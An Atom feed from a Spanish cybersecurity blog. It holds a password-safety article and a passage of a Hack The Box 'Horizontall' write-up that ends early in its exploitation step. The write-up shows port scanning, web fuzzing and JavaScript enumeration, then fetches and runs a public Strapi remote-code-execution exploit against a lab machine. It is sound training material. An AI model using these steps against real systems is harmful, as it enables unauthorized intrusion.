<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-11-02T11:28:23-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ewor01 | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad, CTFs, investigaciones, herramientas, charlas, etc.</subtitle><author><name>ewor01</name></author><entry><title type="html">¿Cómo crear una contraseña segura?</title><link href="http://localhost:4000/contrase%C3%B1as-seguras/" rel="alternate" type="text/html" title="¿Cómo crear una contraseña segura?" /><published>2023-02-13T00:00:00-06:00</published><updated>2023-02-13T00:00:00-06:00</updated><id>http://localhost:4000/contrase%C3%B1as-seguras</id><content type="html" xml:base="http://localhost:4000/contrase%C3%B1as-seguras/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/contraseñas-seguras/contraseñas_seguras.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;cómo-crear-una-contraseña-segura&quot;&gt;¿Cómo crear una contraseña segura?&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Cuanto más avanza Internet, más importante es proteger nuestra información personal.&lt;/li&gt;
  &lt;li&gt;Hoy en día se comparte todo y nuestras fotos, documentos y conversaciones se guardan en la nube. Es la era de la información y estamos conectados todo el día, incluso desde varios dispositivos a la vez.&lt;/li&gt;
  &lt;li&gt;Los avances son buenos porque nos facilitan la vida, pero también motivan a otras personas a invadir nuestra privacidad.&lt;/li&gt;
  &lt;li&gt;Por eso es más fundamental que nunca que nos protejamos de ataques y robos de datos personales.&lt;/li&gt;
&lt;/ul&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/contraseñas-seguras/securepass.png&quot; /&gt;
&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Imagina que no tienes una contraseña segura, alguien descubre la que has usado con el correo electrónico y accede a él. Ahora puede ver los correos que has recibido de tus amigos, del trabajo, del banco. ¿Parece peligroso? Pues lo es, y mucho.&lt;/li&gt;
  &lt;li&gt;Con el acceso a tu correo puede acceder, por ejemplo, a tus redes sociales con solo solicitar recuperar la contraseña. Y no solo eso, también podría acceder a tu cuenta bancaria o cualquier otro sitio al que entres usando tu email.&lt;/li&gt;
  &lt;li&gt;A la hora de elegir una contraseña es normal elegir palabras o números que nos resulten familiares y podamos recordar con facilidad. Por ejemplo, se usan mucho las contraseñas con fechas importantes como la de nuestro cumpleaños, la de nuestro hijo, la del aniversario, etc. Esto es un error más común de lo que nos imaginamos, porque es muy fácil de averiguar.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Riesgos de no tener contraseñas seguras:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Existen miles de filtraciones de datos de grandes empresas donde podria estar tu contraseña.&lt;/li&gt;
  &lt;li&gt;Ciberdelincuentes se hacen con los datos de las personas al adivinar sus contraseñas o atacarlas por medio de diccionarios o fuerza bruta.&lt;/li&gt;
  &lt;li&gt;Contraseñas como “123456” siguen siendo usados por muchas personas en el mundo.&lt;/li&gt;
  &lt;li&gt;Perder el acceso a todas tus cuentas, incluyendo el correo.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Debido a que mucha gente decide crear contraseñas tan inseguras como “11111” o “asdf” vamos a analizar algunos trucos y métodos para crear una contraseña segura y que, además, podamos recordarla con facilidad:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Ya sea que usemos un generador de contraseña o no, debemos seguir ciertas pautas cada vez que se nos pida crear una contraseña a la hora de registrarnos en algún sitio web o red social.&lt;/li&gt;
  &lt;li&gt;No uses nunca contraseñas que solo contengan letras como, por ejemplo, nombres personales, el nombre de tu usuario, familiares, mascotas, ciudades, etc.&lt;/li&gt;
  &lt;li&gt;Tampoco utilices nunca contraseñas únicamente con números que estén relacionados con fechas importantes, direcciones, número de DNI, matrículas o cualquier otro elemento de nuestro entorno cercano que se pueda averiguar fácilmente.&lt;/li&gt;
  &lt;li&gt;Como mínimo, mezcla letras y números elegidos aleatoriamente, que no tengan un orden lógico o deducible. Intercala letras minúsculas con mayúsculas,.&lt;/li&gt;
  &lt;li&gt;La longitud mínima recomendada es de 12 caracteres, aunque si tiene más, mucho mejor.&lt;/li&gt;
  &lt;li&gt;No compartas nunca tus contraseñas con nadie, porque ya no importará cuánto te hayas esforzado por crearla. En ese momento dejará de ser segura.&lt;/li&gt;
  &lt;li&gt;Un error muy común es usar la misma clave para todo. No hagas eso, porque si algún día alguien la descubre, tendrá acceso a todas tus cuentas.&lt;/li&gt;
  &lt;li&gt;Es muy recomendable cambiarlas cada cierto tiempo. Muchos sitios ya te obligan a hacer este cambio como, por ejemplo, los bancos online.&lt;/li&gt;
  &lt;li&gt;Cuidado con las preguntas de seguridad. Si las utilizas, que sólo tú y nadie más sepa las respuestas.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;generadores de contraseñas:&lt;/p&gt;

&lt;p&gt;Los generadores de contraseñas son programas que tienen un algoritmo para generar cadenas de números, letras y símbolos aleatorios con la longitud y características que les indiquemos. Son sencillos de usar y también los hay que permiten recordar y guardar las contraseñas de forma segura.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/contraseñas-seguras/avastpassgen.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;En esta imagen observamos un generador de contraseñas online, el cual es de avast. Te dejo el link por si te sirve de ayuda &lt;a href=&quot;https://www.avast.com/es-ww/random-password-generator#pc&quot;&gt;link&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Gestores de contraseñas:&lt;/p&gt;

&lt;p&gt;Existen muchos gestores de contraseñas, pero en este caso les recomendare 2 los cuales son bitwarden y keepass. Personalmente uso bitwarden es muy sencillo de usar y puedes tener acceso a todas tus contraseñas desde cualquier dispositivo. Keepass hay quienes lo ven mas seguro ya que tu creas la base de datos cifrada de las contraseñas a la cual solo tienes acceso localmente, todo es cuestión de gustos así que te animo a investigar sobre los gestores de contraseñas y escoge el que mejor se adapte a ti.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/contraseñas-seguras/bitwarden.png&quot; /&gt;
&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/contraseñas-seguras/keepass.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Vamos a ver algunas ventajas de usar un gestor de contraseñas:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Los gestores de contraseñas las almacenan en una base de datos cifrada. De esta forma están seguras bajo nuestro control.&lt;/li&gt;
  &lt;li&gt;Otra ventaja principal es que solo tenemos que preocuparnos de generar y recordar la contraseña de acceso a nuestro gestor de contraseñas. Una vez dentro, ya podemos usar el resto sin necesidad de memorizarlas y pudiendo generarlas de forma segura.&lt;/li&gt;
  &lt;li&gt;Un buen gestor de contraseñas debe permitir su uso en diferentes plataformas y dispositivos. De esta forma, podremos usarlos cuando usemos el portátil, la tablet o el teléfono&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Tambien podemos comprobar que tan seguras son nuestras contraseñas con la siguiente herramienta online proporcionada por Karspersky, la cual es muy sencilla de utilizar basta con ir a la web la cual te dejo por aquí &lt;a href=&quot;https://password.kaspersky.com/es/&quot;&gt;link&lt;/a&gt; solo colocas la contraseña a comprobar y obtendras el resultado de que tan seguras son tus contraseñas.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Con esto concluimos el post espero les sirva de ayuda y nos vemos en el siguiente, ayúdame compartiendo mi sitio con tus amigos, gracias.&lt;/strong&gt;&lt;/p&gt;</content><author><name>ewor01</name></author><category term="contraseñas seguras" /><summary type="html">¿Te gustaría aprender sobre Cómo crear contraseñas seguras y hacer un uso adecuado de estas?, vamos a ello.</summary></entry><entry><title type="html">Horizontall - Hack The Box</title><link href="http://localhost:4000/horizontall-hackthebox/" rel="alternate" type="text/html" title="Horizontall - Hack The Box" /><published>2023-02-05T00:00:00-06:00</published><updated>2023-02-05T00:00:00-06:00</updated><id>http://localhost:4000/horizontall-hackthebox</id><content type="html" xml:base="http://localhost:4000/horizontall-hackthebox/">&lt;p&gt;Certificaciones a aplicar: eJPT, eWPT&lt;/p&gt;

&lt;p&gt;Dificultad: Fácil&lt;/p&gt;

&lt;p&gt;Habilidades:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Information Leakage&lt;/li&gt;
  &lt;li&gt;Port Forwarding&lt;/li&gt;
  &lt;li&gt;Strapi CMS Exploitation&lt;/li&gt;
  &lt;li&gt;Laravel Exploitation&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Horizontall.png&quot; alt=&quot;Captura de pantalla (62).png&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;ip-de-la-maquina&quot;&gt;IP de la Maquina&lt;/h1&gt;

&lt;p&gt;10.10.11.105&lt;/p&gt;

&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h1&gt;

&lt;p&gt;Identificando el sistema operativo.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whichSystem.py 10.10.11.105
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-17-57-12.png&quot; alt=&quot;Hackforce-2022-12-11-17-57-12.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Escaneo de los puertos y guardamos en formato grep en el ficherito allPorts.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.11.105 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-17-56-15.png&quot; alt=&quot;Hackforce-2022-12-11-17-56-15.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Función extractPorts.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extractPorts allPorts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-00-00.png&quot; alt=&quot;Hackforce-2022-12-11-18-00-00.png&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;análisis-de-vulnerabilidades&quot;&gt;Análisis de Vulnerabilidades&lt;/h1&gt;

&lt;p&gt;Buscando versiones y servicios que corren para esos puertos y lo guardamos en formato nmap en el ficherito targeted.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 10.10.11.105 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-01-23.png&quot; alt=&quot;Hackforce-2022-12-11-18-01-23.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a identificar ante que nos estamos enfrentando de la siguiente manera colocamos en el navegador launchpad 4ubuntu0.5 y nos dara el siguiente resultado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-07-31.png&quot; alt=&quot;Hackforce-2022-12-11-18-07-31.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera vemos que estamos ante un Ubuntu Bionic.&lt;/p&gt;

&lt;p&gt;Luego vemos que nmap nos reporta que hay un follow redirect hacia &lt;a href=&quot;http://horizontall.htb/&quot;&gt;http://horizontall.htb&lt;/a&gt; entonces verificamos con whatweb y debería mostrar lo mismo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-11-03.png&quot; alt=&quot;Hackforce-2022-12-11-18-11-03.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En efecto vemos que nos muestra lo mismo, si colocamos esa dirección en el navegador nos dará error ya que se esta aplicando virtual hosting.&lt;/p&gt;

&lt;p&gt;Para agregarla editamos el fichero que esta /etc/hosts de la siguiente manera.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-16-41.png&quot; alt=&quot;Hackforce-2022-12-11-18-16-41.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Con esto ya tendria que resolvernos el dominio en la ip privada y para comprobar emitimos un ping hacia el dominio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-18-08.png&quot; alt=&quot;Hackforce-2022-12-11-18-18-08.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Luego vamos a aplicar el script http-enum de nmap al dominio agregado y lo guardamos en formato nmap y lo exportamos en el ficherito webScan.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-23-25.png&quot; alt=&quot;Hackforce-2022-12-11-18-23-25.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si no nos encontro nada como es el caso borramos el ficherito.&lt;/p&gt;

&lt;p&gt;Vamos a hacer Fuzzing con wfuzz&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 200 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://horizontall.htb/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-09-04.png&quot; alt=&quot;Hackforce-2022-12-11-23-09-04.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos encontró 3 directorios los analizamos y miramos si hay algo si no inspeccionaremos el código fuente de la pagina a ver si hay alguna pista.&lt;/p&gt;

&lt;p&gt;Lanzamos un Curl al sitio haciendo una petición GET.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://horizontall.htb/&quot;&lt;/span&gt; | htmlq &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-19-45.png&quot; alt=&quot;Hackforce-2022-12-11-23-19-45.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos lo mostrara asi para inspeccionar mejor el código y vemos algo medio intersante haciendo referencia a unos archivos java script.&lt;/p&gt;

&lt;p&gt;Vamos a utilizar unas expresiones regulares con grep para filtrar por lo que nos interesa.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://horizontall.htb/&quot;&lt;/span&gt; | htmlq &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; html | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&quot;.*?&quot;'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;app&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-30-41.png&quot; alt=&quot;Hackforce-2022-12-11-23-30-41.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos dos rutas, la de css no es de tanto interes asi que vamos a mirar la de js.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://horizontall.htb/js/app.c68eb462.js&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-33-15.png&quot; alt=&quot;Hackforce-2022-12-11-23-33-15.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos lo siguiente, no miramos nada así que vamos a filtrar para ver si logramos obtener algo.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://horizontall.htb/js/app.c68eb462.js&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;htb&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-38-34.png&quot; alt=&quot;Hackforce-2022-12-11-23-38-34.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos algo interesante así que vamos a crear una expresión regular una vez mas y que nos filtre por http.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://horizontall.htb/js/app.c68eb462.js&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&quot;.*?&quot;'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;http |  &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-42-50.png&quot; alt=&quot;Hackforce-2022-12-11-23-42-50.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahi tenemos lo que nos interesa así que vamos a verlo en el navegador, pero antes tenemos que agregarlo al /etc/hosts.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-45-13.png&quot; alt=&quot;Hackforce-2022-12-11-23-45-13.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora lo miramos en el navegador y vemos con wappalyzer que tecnologias posee.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-47-17.png&quot; alt=&quot;Hackforce-2022-12-11-23-47-17.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos un CMS llamado strapi.&lt;/p&gt;

&lt;p&gt;Buscamos con searchsploit una posible vulnerabilidad.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit  strapi
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-49-24.png&quot; alt=&quot;Hackforce-2022-12-11-23-49-24.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos 3 vulnerabilidades encontradas.&lt;/p&gt;

&lt;p&gt;Vamos a verlo por consola la url que vimos anteriormente &lt;a href=&quot;http://api-prod.horizontall.htb/reviews&quot;&gt;http://api-prod.horizontall.htb/reviews&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://api-prod.horizontall.htb/reviews&quot;&lt;/span&gt; | jq
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-53-10.png&quot; alt=&quot;Hackforce-2022-12-11-23-53-10.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos posibles usuarios pero nada mas así que volveremos a hacer fuzzing con wfuzz.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 200 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404,200 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;s2&quot;&gt;&quot;http://api-prod.horizontall.htb/FUZZ&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-06-57.png&quot; alt=&quot;Hackforce-2022-12-12-00-06-57.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos por ahi un par de cosas interesantes por ejem visitaremos la ruta de admin a ver que hay.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-08-30.png&quot; alt=&quot;Hackforce-2022-12-12-00-08-30.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos un panel de autenticacion pero no disponemos de credenciales, antes probamos buscar las de default a ver si logramos entrar.&lt;/p&gt;

&lt;p&gt;Ahora haremos Fuzzing de nuevo a esta ruta &lt;a href=&quot;http://api-prod.horizontall.htb/admin/&quot;&gt;http://api-prod.horizontall.htb/admin/&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;854 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 200 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;s2&quot;&gt;&quot;http://api-prod.horizontall.htb/admin/FUZZ&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-43-41.png&quot; alt=&quot;Hackforce-2022-12-12-00-43-41.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Miramos un par de directorios interesantes.&lt;/p&gt;

&lt;p&gt;Al visitar el directorio Init podemos contemplar la version de Strapi y si buscamos con searchsploit como lo hicimos anteriormente miraremos que es vulnerable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-49-13.png&quot; alt=&quot;Hackforce-2022-12-12-00-49-13.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit strapi
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-51-06.png&quot; alt=&quot;Hackforce-2022-12-12-00-51-06.png&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;explotación&quot;&gt;Explotación&lt;/h1&gt;

&lt;p&gt;Nos dirigimos a la carpeta exploit de nuestros directorios de trabajo y nos copiamos el que dice remote code execution (Unauthenticated).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; multiple/webapps/50239.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lo renombramos.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;50239.py rce_strapi.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-57-51.png&quot; alt=&quot;Hackforce-2022-12-12-00-57-51.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ejecutamos el exploit para ver que nos pide.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 rce_strapi.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-59-28.png&quot; alt=&quot;Hackforce-2022-12-12-00-59-28.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como vemos solo nos pide la url.&lt;/p&gt;

